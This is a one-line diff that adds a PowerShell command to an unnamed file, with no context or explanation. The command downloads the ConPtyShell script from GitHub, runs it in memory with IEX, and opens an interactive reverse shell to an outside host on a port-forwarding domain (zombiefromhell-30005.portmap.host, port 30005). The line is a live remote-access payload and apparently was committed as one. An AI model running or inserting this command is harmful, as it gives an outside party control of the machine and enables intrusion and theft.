@@ -1,0 +1,1 @@
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell zombiefromhell-30005.portmap.host 30005
